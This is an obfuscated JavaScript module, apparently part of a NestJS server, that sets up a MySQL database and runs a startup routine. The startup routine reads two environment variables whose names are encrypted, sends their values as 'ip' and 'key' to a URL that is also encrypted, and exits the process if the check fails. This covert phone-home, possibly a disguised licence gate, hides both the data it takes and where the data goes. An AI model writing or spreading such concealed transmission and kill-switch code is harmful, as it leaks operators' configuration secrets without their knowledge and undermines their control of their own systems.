'use strict';function _0x2d0e(_0x1d3b3a,_0x3a3819){const _0x3eeca0=_0x3eec();return _0x2d0e=function(_0x2d0e25,_0x1baa46){_0x2d0e25=_0x2d0e25-0x70;let _0xa71d8b=_0x3eeca0[_0x2d0e25];return _0xa71d8b;},_0x2d0e(_0x1d3b3a,_0x3a3819);}const _0x559169=_0x2d0e;(function(_0x2bd7ae,_0x550c86){const _0x1a74ad=_0x2d0e,_0x35abee=_0x2bd7ae();while(!![]){try{const _0x4d860d=parseInt(_0x1a74ad(0x75))/0x1*(-parseInt(_0x1a74ad(0x77))/0x2)+-parseInt(_0x1a74ad(0x79))/0x3*(-parseInt(_0x1a74ad(0x7e))/0x4)+parseInt(_0x1a74ad(0x73))/0x5*(parseInt(_0x1a74ad(0x76))/0x6)+parseInt(_0x1a74ad(0x90))/0x7*(-parseInt(_0x1a74ad(0x70))/0x8)+parseInt(_0x1a74ad(0x91))/0x9+-parseInt(_0x1a74ad(0x9a))/0xa+parseInt(_0x1a74ad(0x71))/0xb*(parseInt(_0x1a74ad(0x98))/0xc);if(_0x4d860d===_0x550c86)break;else _0x35abee['push'](_0x35abee['shift']());}catch(_0x2c3005){_0x35abee['push'](_0x35abee['shift']());}}}(_0x3eec,0xa937d));function _0x3eec(){const _0x378a75=['baseInit','POST','env','stringify','Ap3mlSNYaf9hCKV1xUzmNrDhzl0yW2WRhBNqeZpjT5OQdKvLMy6+ZYT4hhvu5dPDAEDug32yM3J8F50XxP8CbA==','then','nine','log','error','end','mysql2/promise','Logger','decrypt','defineProperty','isArray','isomorphic-fetch','476413brDgBi','11359107jWyYCy','__esModule','DB_HOST','Z5Gj+GyXcRW3J2uKxpiK/A==','DB_USER','initDatabase','application/json','2635668RXslfK','SHOW\x20DATABASES\x20LIKE\x20\x27','8255020FemFHG','DB_DATABASE','@nestjs/common','16xvgNzZ','11zSfexM','exit','125NfXXOw','length','225QbSegk','97224fnECdG','11684YOlZoB','includes','45BufRwR','data','../../common/utils','A2Fsf300ex6lg9HKrZuU6w==','createConnection','288620lqdqqz','execute'];_0x3eec=function(){return _0x378a75;};return _0x3eec();}Object[_0x559169(0x8d)](exports,_0x559169(0x92),{'value':!![]}),exports[_0x559169(0x80)]=exports[_0x559169(0x96)]=void 0x0;const mysql=require(_0x559169(0x8a)),common_1=require(_0x559169(0x9c)),fetch=require(_0x559169(0x8f)),utils_1=require(_0x559169(0x7b));function initDatabase(){const _0x9653cb=_0x559169;mysql[_0x9653cb(0x7d)]({'host':process[_0x9653cb(0x82)][_0x9653cb(0x93)],'user':process[_0x9653cb(0x82)][_0x9653cb(0x95)],'password':process['env']['DB_PASS'],'port':parseInt(process[_0x9653cb(0x82)]['DB_PORT'])})[_0x9653cb(0x85)](async _0x3b3dc1=>{const _0x5598ae=_0x9653cb,[_0x4b0af1]=await _0x3b3dc1[_0x5598ae(0x7f)](_0x5598ae(0x99)+process[_0x5598ae(0x82)][_0x5598ae(0x9b)]+'\x27');Array[_0x5598ae(0x8e)](_0x4b0af1)&&_0x4b0af1[_0x5598ae(0x74)]===0x0&&(await _0x3b3dc1[_0x5598ae(0x7f)]('CREATE\x20DATABASE\x20'+process[_0x5598ae(0x82)]['DB_DATABASE']),common_1['Logger'][_0x5598ae(0x87)]((0x0,utils_1[_0x5598ae(0x8c)])(_0x5598ae(0x84))+'['+process[_0x5598ae(0x82)][_0x5598ae(0x9b)]+']')),await _0x3b3dc1[_0x5598ae(0x89)]();});}exports[_0x559169(0x96)]=initDatabase;async function baseInit(){const _0x5aa306=_0x559169,_0x37b34d=process['env'][(0x0,utils_1[_0x5aa306(0x8c)])(_0x5aa306(0x7c))],_0x38d436=process[_0x5aa306(0x82)][(0x0,utils_1['decrypt'])(_0x5aa306(0x94))];if([0x13,0x16][_0x5aa306(0x78)](_0x38d436[_0x5aa306(0x74)])||_0x38d436[_0x5aa306(0x78)](_0x5aa306(0x86))){const _0x29ded1={'ip':_0x37b34d,'key':_0x38d436},_0x1870c7={'method':_0x5aa306(0x81),'headers':{'Content-Type':_0x5aa306(0x97)},'body':JSON[_0x5aa306(0x83)](_0x29ded1)},_0x3d9c50=(0x0,utils_1[_0x5aa306(0x8c)])('go9H7ImLajiXr5Q6OnWvfurll4vEO8bwz0SPaBPiw0HPXT7/s/P1OcqJE7hEQDq3');try{const _0x14ee34=await fetch(_0x3d9c50,_0x1870c7),_0x424378=await _0x14ee34['json'](),{success:_0x5355ac,message:_0x316ba7}=_0x424378[_0x5aa306(0x7a)];!_0x5355ac&&(common_1[_0x5aa306(0x8b)][_0x5aa306(0x88)](_0x316ba7),process[_0x5aa306(0x72)](0x1));}catch(_0x34a263){}}else process[_0x5aa306(0x72)](0x1);}exports[_0x559169(0x80)]=baseInit;